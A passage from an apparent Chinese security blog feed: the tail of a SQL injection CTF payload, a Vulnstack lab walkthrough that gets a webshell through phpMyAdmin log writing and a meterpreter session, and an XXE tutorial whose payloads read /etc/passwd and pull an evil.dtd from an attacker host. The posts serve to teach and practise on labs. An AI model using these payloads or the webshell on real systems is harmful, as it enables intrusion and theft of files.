from (select group_concat(username) from users) a join (select group_concat(flag_9c861b688330) from users) b %23</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1-何为SQL注入？&quot;&gt;&lt;a href=&quot;#1-何为SQL注入？&quot; class=&quot;headerlink&quot; title=&quot;1 何为SQL注入？&quot;&gt;&lt;/a&gt;&lt;strong&gt;1 何为SQL注入？&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;SQL注入是一种注入攻击，由于用户的输入也
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.kaide0521.cn/categories/CTF/"/>
    
    
      <category term="SQL注入" scheme="https://blog.kaide0521.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Vulnstack靶机练习（一）</title>
    <link href="https://blog.kaide0521.cn/2020/01/12/Vulnstack%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://blog.kaide0521.cn/2020/01/12/Vulnstack%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2020-01-12T13:46:37.000Z</published>
    <updated>2020-02-22T03:30:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Vulnstack靶机练习（一）"><a href="#Vulnstack靶机练习（一）" class="headerlink" title="Vulnstack靶机练习（一）"></a><strong>Vulnstack靶机练习（一）</strong></h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>首先感谢红日安全团队开源的靶机环境，具体的下载地址：<br><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p>本文基于vulnstack靶机环境来聊聊内网渗透的那些事。</p><h2 id="本地环境搭建"><a href="#本地环境搭建" class="headerlink" title="本地环境搭建"></a><strong>本地环境搭建</strong></h2><p>kali 攻击机  192.168.54.130</p><p>vulnstack-win7 第一层靶机 对外暴漏服务<br>192.168.54.129<br>192.168.52.143</p><p>vulnstack-Win2K3 域内靶机<br>192.168.52.141</p><p>vulnstack-winserver08 域控主机<br>192.168.52.138</p><p><img src="https://img-blog.csdnimg.cn/20200112104940195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="第一层靶机渗透"><a href="#第一层靶机渗透" class="headerlink" title="第一层靶机渗透"></a><strong>第一层靶机渗透</strong></h2><p>假设vulnstack-win7为第一层靶机，并且对外提供服务，攻击者能直接访问该机器暴漏的web服务，攻击者获取了该机器的IP地址192.168.54.129，于是尝试对该主机进行端口探测：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sV -Pn 192.168.54.129</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-12 11:01 CST</span><br><span class="line">Nmap scan report for 192.168.54.129</span><br><span class="line">Host is up (0.00045s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:0C:29:EA:57:EC (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 34.63 seconds</span><br></pre></td></tr></table></figure><p>发现主机除了暴漏web服务外，还暴露了mysql服务，后台使用windows操作系统，我们先看mysql服务有什么可以利用点</p><h3 id="mysql服务信息搜集及利用"><a href="#mysql服务信息搜集及利用" class="headerlink" title="mysql服务信息搜集及利用"></a><strong>mysql服务信息搜集及利用</strong></h3><p>扫描一下看mysql服务是否支持外连</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/mysql/mysql_login) &gt; run</span><br><span class="line"></span><br><span class="line">[-] 192.168.54.129:3306   - 192.168.54.129:3306 - Unsupported target version of MySQL detected. Skipping.</span><br><span class="line">[*] 192.168.54.129:3306   - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf5 auxiliary(scanner/mysql/mysql_login) &gt; mysql -h 192.168.54.129 -uroot</span><br><span class="line">[*] exec: mysql -h 192.168.54.129 -uroot</span><br><span class="line"></span><br><span class="line">ERROR 1130 (HY000): Host '192.168.54.130' is not allowed to connect to this MySQL server</span><br><span class="line">msf5 auxiliary(scanner/mysql/mysql_login) &gt; clear</span><br></pre></td></tr></table></figure><p>发现无法利用，此路不通另寻别路。</p><h3 id="Web服务信息搜集及利用"><a href="#Web服务信息搜集及利用" class="headerlink" title="Web服务信息搜集及利用"></a><strong>Web服务信息搜集及利用</strong></h3><p>根据扫描出来的信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)</span><br></pre></td></tr></table></figure><p>发现是一个PHP的站点，直接访问：</p><p><img src="https://img-blog.csdnimg.cn/20200112112935160.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>根据能发现有管php的很多信息，比如已编译模块检测、PHP相关参数等，但是没有发现能直接利用的点，接着尝试扫描一下网站目录，看是否能发现一些其他的有用信息。</p><p>发现后台存在phpMyAdmin</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[11:35:09] 200 -   71KB - /phpinfo.php</span><br><span class="line">[11:35:09] 301 -  241B  - /phpmyadmin  -&gt;  http://192.168.54.129/phpmyadmin/</span><br><span class="line">[11:35:09] 301 -  241B  - /phpMyAdmin  -&gt;  http://192.168.54.129/phpMyAdmin/</span><br><span class="line">[11:35:09] 403 -  221B  - /phpMyAdmin.%2A</span><br><span class="line">[11:35:10] 200 -    4KB - /phpMyAdmin/</span><br><span class="line">[11:35:10] 200 -    4KB - /phpmyadmin/</span><br><span class="line">[11:35:10] 200 -    4KB - /phpMyadmin/</span><br><span class="line">[11:35:10] 200 -    4KB - /phpmyAdmin/</span><br></pre></td></tr></table></figure><p>尝试phpMyAdmin弱口令root登录，发现能成功登录，并且能清楚的看到后台还有一个yxcms, 可尝试使用cms的漏洞getshell。这里我们先尝试使用phpMyAdmin的相关漏洞看能否getshell。<br><img src="https://img-blog.csdnimg.cn/20200112173144541.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>phpMyAdmin利用方式有多种：</p><ul><li>直接写入文件getshell</li><li>利用日志getshell</li><li>利用本地文件包含漏洞getshell</li></ul><p>首先尝试写文件，发现无法写文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE '%secure%';</span><br><span class="line">secure_file_priv值为NULL，说明禁止导出。</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200112174117442.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再尝试利用日志来获取shell:</p><p>第一步手动开启日志</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="string">'on'</span>;</span><br></pre></td></tr></table></figure><p>然后 查看是否开启成功</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">"general_log%"</span>;</span><br></pre></td></tr></table></figure><p>设置日志输出的路径</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span>  general_log_file =<span class="string">"C:\\phpStudy\\WWW\\test.php"</span>;</span><br></pre></td></tr></table></figure><p>然后只要执行的语句都会写入到日志文件中，所以我们查询语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">"&lt;?php eval($_POST['a']);?&gt;"</span>;</span><br></pre></td></tr></table></figure><p>发现能成功获取shell<br><img src="https://img-blog.csdnimg.cn/20200112180118772.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后利用菜刀连接，上传反弹木马，获取一个meterpreter控制会话：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started bind TCP handler against 192.168.54.129:4444</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.54.129</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.54.130:33269 -&gt; 192.168.54.129:4444) at 2020-01-12 07:39:32 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br><span class="line">meterpreter &gt; dir</span><br><span class="line">Listing: C:\phpStudy</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Mode              Size     Type  Last modified              Name</span><br><span class="line">----              ----     ----  -------------              ----</span><br><span class="line">40777/rwxrwxrwx   0        dir   2019-10-13 04:39:24 -0400  Apache</span><br><span class="line">40777/rwxrwxrwx   0        dir   2019-10-13 04:39:24 -0400  IIS</span><br><span class="line">40777/rwxrwxrwx   4096     dir   2019-10-13 04:39:24 -0400  MySQL</span><br><span class="line">40777/rwxrwxrwx   4096     dir   2019-10-13 04:39:24 -0400  SQL-Front</span><br><span class="line">40777/rwxrwxrwx   4096     dir   2019-10-13 04:39:24 -0400  WWW</span><br><span class="line">40777/rwxrwxrwx   0        dir   2019-10-13 04:39:24 -0400  backup</span><br><span class="line">40777/rwxrwxrwx   0        dir   2019-10-13 04:39:24 -0400  nginx</span><br><span class="line">40777/rwxrwxrwx   4096     dir   2019-10-13 04:39:24 -0400  php</span><br><span class="line">100777/rwxrwxrwx  2471424  fil   2019-10-13 04:39:38 -0400  phpStudy.exe</span><br><span class="line">100666/rw-rw-rw-  113      fil   2019-10-13 04:39:25 -0400  phpStudy官网.url</span><br><span class="line">100666/rw-rw-rw-  522752   fil   2019-10-13 04:39:38 -0400  phpshao.dll</span><br><span class="line">100777/rwxrwxrwx  7168     fil   2020-01-12 07:36:46 -0500  shell.exe</span><br><span class="line">40777/rwxrwxrwx   4096     dir   2019-10-13 04:39:24 -0400  tmp</span><br><span class="line">40777/rwxrwxrwx   4096     dir   2019-10-13 04:39:24 -0400  tools</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>未完待续</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Vulnstack靶机练习（一）&quot;&gt;&lt;a href=&quot;#Vulnstack靶机练习（一）&quot; class=&quot;headerlink&quot; title=&quot;Vulnstack靶机练习（一）&quot;&gt;&lt;/a&gt;&lt;strong&gt;Vulnstack靶机练习（一）&lt;/strong&gt;&lt;/h1&gt;
      
    
    </summary>
    
    
      <category term="红蓝对抗" scheme="https://blog.kaide0521.cn/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
      <category term="靶机" scheme="https://blog.kaide0521.cn/tags/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="域控" scheme="https://blog.kaide0521.cn/tags/%E5%9F%9F%E6%8E%A7/"/>
    
  </entry>
  
  <entry>
    <title>一文带你了解XXE漏洞攻防</title>
    <link href="https://blog.kaide0521.cn/2020/01/12/XXE%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/"/>
    <id>https://blog.kaide0521.cn/2020/01/12/XXE%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/</id>
    <published>2020-01-12T13:46:37.000Z</published>
    <updated>2020-02-22T04:38:02.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x001-XXE漏洞简介"><a href="#0x001-XXE漏洞简介" class="headerlink" title="0x001 XXE漏洞简介"></a><strong>0x001 XXE漏洞简介</strong></h3><p>XXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加<br>载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。</p><h3 id="0x002-XML基础知识"><a href="#0x002-XML基础知识" class="headerlink" title="0x002 XML基础知识"></a><strong>0x002 XML基础知识</strong></h3><p>XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。</p><h3 id="0x003-DTD基础知识"><a href="#0x003-DTD基础知识" class="headerlink" title="0x003 DTD基础知识"></a><strong>0x003 DTD基础知识</strong></h3><pre><code>• DTD（文档类型定义）的作用是定义XML文档的合法构建模块• DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。• 可以认为DTD定义了一种针对XML的格式描述，任何一个XML文件都可以引用。</code></pre><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [  　　&lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span>  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">head</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"></span><br><span class="line">• PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。</span><br><span class="line"></span><br><span class="line">• 如：<span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span> 它表示在<span class="tag">&lt;<span class="name">name</span>&gt;</span>和<span class="tag">&lt;/<span class="name">name</span>&gt;</span>标签之间可以插入字符或者子标签。这些字符将被解析器解析</span><br><span class="line"></span><br><span class="line">• CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</span><br><span class="line"></span><br><span class="line">• 内部DTD文档：<span class="meta">&lt;!DOCTYPE 根元素  [定义内容]&gt;</span></span><br><span class="line"></span><br><span class="line">• 外部DTD文档：<span class="meta">&lt;!DOCTYPE 根元素  <span class="meta-keyword">SYSTEM</span> “DTD文件路径”&gt;</span></span><br><span class="line"></span><br><span class="line">• 内外部DTD文档结合：<span class="meta">&lt;!DOCTYPE 根元素  <span class="meta-keyword">SYSTEM</span> “DTD文件路径” [定义内容-]&gt;</span></span><br><span class="line"></span><br><span class="line">• 引用公共实体: <span class="meta">&lt;!DOCTYPE 根元素名称 <span class="meta-keyword">PUBLIC</span> “DTD标识名” “公用DTD的URI”&gt;</span></span><br></pre></td></tr></table></figure><p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体）</p><p><strong>通用实体</strong></p><p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">updateProfile</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///c:/windows/win.ini"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">updateProfile</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Joe<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">lastname</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">lastname</span>&gt;</span>  </span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">updateProfile</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>参数实体：</strong></p><p>(1) 使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 % 实体名; 引用</p><p>(2) 只有在 DTD 文件中，参数实体的声明才能引用其他实体</p><p>(3) 和通用实体一样，参数实体也可以外部引用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///C:/windows/win.ini"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://192.168.100.1/test.xml"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote; %all; &lt;!--  只有在 DTD 文件中，参数实体的声明才能引用其他实体 --&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x004-我们能做什么"><a href="#0x004-我们能做什么" class="headerlink" title="0x004 我们能做什么"></a><strong>0x004 我们能做什么</strong></h3><p><strong>实验一：有回显读本地敏感文件(Normal XXE)</strong></p><p><img src="https://img-blog.csdnimg.cn/20200222114016265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>• <strong>Payload</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span> <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span> <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利, 那么有特殊符号的文件呢?</p><p>• <strong>对于PHP来说，可以使用伪协议返回base64字符串</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">          <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=/etc/passwd"</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">root</span>&gt;</span> <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span> <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p> <img src="https://img-blog.csdnimg.cn/20200222114227237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>• <strong>使用CDATA 不返回被解析的数据</strong></p><p>有些内容可能不想让解析引擎解析执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 &lt;&gt; &amp; 或者<br>“ 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记，可以输入任意字符除了]]&gt;不能嵌套。用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA包起来。如何包裹呢？？？我们知道我们只有一种选择，就是使用 参数实体。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">roottag</span> [</span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">"&lt;![CDATA["</span>&gt;</span>   </span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY % <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">"]]&gt;"</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://192.168.137.131:8081/evil.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd; ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">roottag</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">roottag</span>&gt;</span></span><br><span class="line"></span><br><span class="line">evil.dtd文件的内容为：</span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">all</span> <span class="meta-string">"%start;%goodies;%end;"</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200222114457796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>新的问题出现</strong></p><p>但是，你想想也知道，本身人家服务器上的 XML 就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带</p><p><strong>新的解决方法</strong></p><p>想要外带就必须能发起请求，那么什么地方能发起请求呢？ 